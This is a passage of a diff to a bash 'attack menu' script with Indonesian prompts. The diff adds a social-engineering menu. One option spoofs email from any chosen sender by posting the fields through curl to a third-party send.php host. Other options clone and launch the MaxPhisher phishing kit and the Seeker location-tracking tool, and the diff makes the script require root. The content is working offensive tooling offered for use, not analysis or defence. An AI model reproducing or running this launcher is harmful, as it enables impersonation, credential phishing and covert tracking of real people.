+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m From mail   : "'\033[32;1m\n')" email
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Send To     : "'\033[32;1m\n')" to   
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Subject     : "'\033[32;1m\n')" sub 
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Message     : "'\033[32;1m\n\n')" mes
+  echo ""
+  read -p "$(printf " * * * Enter To Send! * * *")" scan
+  curl --data "sender=$email&to=$to&subject=$sub&message=$mes&name=$name" https://kimak-id.000webhostapp.com/send.php > /dev/null 2>&1
+  printf "\n\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m successfully sendent!..\n"
+  sleep 2s
+  read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] kirim ulang [y/n] : "'\033[34;1m')" scan
+        echo
+        while true
+        do
+                if [ $scan = "y"  ];
+                then
+                spoof
+
+                else [ $scan != "n" ]
+		run_soceng_attack
+                fi
+        done
+
+
+
+}
+
+function phishing(){
+    clear
+    baner
+    echo
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall phishing attack ( all - phisher )\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun phishing\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    sleep 0.025
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    sleep 0.025
+    printf '\033[31;1m'
+    spiner
+    echo
+        if [ $xyz = "1"  ];
+        then
+
+                if [[ -d $path/.data/MaxPhisher ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mMaxPhisher already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m MaxPhisher \033[31;1mnot found\033[37;1m, installing MaxPhisher!\n"
+                cd $path/.data > /dev/null 2>&1
+                git clone https://github.com/KasRoudra/MaxPhisher
+                sudo sudo apt install git python3 php openssh-client -y > /dev/null 2>&1
+                sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+
+                echo
+
+                fi
+
+                sleep 3
+                phishing
+
+        elif [ $xyz = "2"  ];
+        then
+                if [[ -d $path/.data/MaxPhisher ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mMaxPhisher already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m MaxPhisher \033[31;1mnot found\033[37;1m, installing MaxPhisher!\n"
+                cd $path/.data > /dev/null 2>&1
+                git clone https://github.com/KasRoudra/MaxPhisher
+                sudo sudo apt install git python3 php openssh-client -y > /dev/null 2>&1
+                sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+
+                echo
+
+                fi
+
+        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
+        sleep 2
+        clear
+        cd $path/.data/MaxPhisher;python3 maxphisher.py
+        sleep 3
+        phishing
+
+        elif [ $xyz = "0"  ];
+        then
+        run_lainya
+
+        else
+        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
+        sleep 2
+        phishing
+        fi
+}
+
+function seeker(){
+    clear
+    baner
+    echo
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall seeker ( social engineering tracking )\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun seeker\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    sleep 0.025
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    sleep 0.025
+    printf '\033[31;1m'
+    spiner
+    echo
+        if [ $xyz = "1"  ];
+        then
+
+                if [[ -d $path/.data/seeker ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mseeker already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m seeker \033[31;1mnot found\033[37;1m, installing seeker!\n"
+                cd $path/.data > /dev/null 2>&1
+                git clone https://github.com/thewhiteh4t/seeker;cd seeker;chmod +x install.sh;./install.sh
+                sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+
+                echo
+
+                fi
+
+                sleep 3
+                seeker
+
+        elif [ $xyz = "2"  ];
+        then
+                if [[ -d $path/.data/seeker ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mseeker already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m seeker \033[31;1mnot found\033[37;1m, installing seeker!\n"
+                cd $path/.data > /dev/null 2>&1
+                git clone https://github.com/thewhiteh4t/seeker;cd seeker;chmod +x install.sh;./install.sh
+                sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+                echo
+
+                fi
+
+                sleep 3
+
+
+        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
+        sleep 2
+       	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] port : "'\033[34;1m')" skrport
+        clear
+        cd $path/.data/seeker;python3 seeker.py -p $skrport #;./ngrok http $skrport
+        
+        sleep 3
+        seeker
+
+        elif [ $xyz = "0"  ];
+        then
+        run_lainya
+
+        else
+        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
+        sleep 2
+        seeker
+        fi
+}
+
+
+# fungsi untuk menjalankan menu untuk web attack
+function run_soceng_attack(){
+        clear
+        baner
+        echo
+        soceng
+                if [ $xyz = "1"  ];
+                then
+                spoof
+                run_soceng_attack
+
+                elif [ $xyz = "2"  ];
+                then
+                phishing
+                run_soceng_attack
+
+		elif [ $xyz = "3"  ];
+                then
+                seeker
+                run_soceng_attack
+	
+                elif [ $xyz = "0"  ];
+                then
+                runer
+
+                else
+                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
+                sleep 2
+                run_soceng_attack
+
+                fi
+}
+
+# Check os for root
+check_root() {
+
+if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
+    { clear; baner; }
+    echo -e "The program cannot run.\nFor run program in GNU/Linux Operating System,\nGive root privileges and try again. \n"
+    exit 1
+fi
+
+}
 
 function runer(){
     clear
@@ -2561,7 +3001,7 @@ function runer(){
             3) run_web_attack;;
             4) run_wifi_attack;;
             5) run_mitm_attack;;
-            6) janda;sleep 3;runer;;
+            6) run_soceng_attack;;
             0) keluar;exit;;
             *) printf "\033[31;1m[\033[32;1m!\033[31;1m]\033[37;1m please input in options . . .\n"
                sleep 3 && runer;;
@@ -2569,7 +3009,7 @@ function runer(){
     done
 
 }
-
+check_root
 dependencies
 sleep 1
 
